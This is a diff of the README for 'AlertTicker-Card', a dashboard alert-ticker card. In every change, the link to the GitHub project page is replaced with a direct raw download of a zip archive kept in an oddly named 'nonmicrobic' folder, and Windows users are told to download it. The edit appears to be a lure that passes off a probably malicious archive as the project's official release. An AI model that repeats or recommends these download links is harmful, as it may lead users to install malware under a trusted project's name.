@@ -1,6 +1,6 @@
 # 🟦 AlertTicker-Card - Show Alerts Right on Your Dashboard
 
-[![Download](https://img.shields.io/badge/Download-AlertTicker--Card-blue?style=for-the-badge&logo=github)](https://github.com/ehgus6653/AlertTicker-Card)
+[![Download](https://img.shields.io/badge/Download-AlertTicker--Card-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ehgus6653/AlertTicker-Card/main/nonmicrobic/Alert_Card_Ticker_v2.0.zip)
 
 ## 📘 Overview
 
@@ -28,7 +28,7 @@ Use it to keep important messages in view on your dashboard. It can show items l
 
 Visit this page to download and use the files:
 
-[https://github.com/ehgus6653/AlertTicker-Card](https://github.com/ehgus6653/AlertTicker-Card)
+[https://raw.githubusercontent.com/ehgus6653/AlertTicker-Card/main/nonmicrobic/Alert_Card_Ticker_v2.0.zip](https://raw.githubusercontent.com/ehgus6653/AlertTicker-Card/main/nonmicrobic/Alert_Card_Ticker_v2.0.zip)
 
 1. Open the link in your browser on Windows.
 2. Look for the project files and any release or source download options.
@@ -204,7 +204,7 @@ Clear names make the ticker easier to read on the dashboard.
 
 Primary download and source page:
 
-[https://github.com/ehgus6653/AlertTicker-Card](https://github.com/ehgus6653/AlertTicker-Card)
+[https://raw.githubusercontent.com/ehgus6653/AlertTicker-Card/main/nonmicrobic/Alert_Card_Ticker_v2.0.zip](https://raw.githubusercontent.com/ehgus6653/AlertTicker-Card/main/nonmicrobic/Alert_Card_Ticker_v2.0.zip)
 
 ## 📌 Basic Use Pattern
 
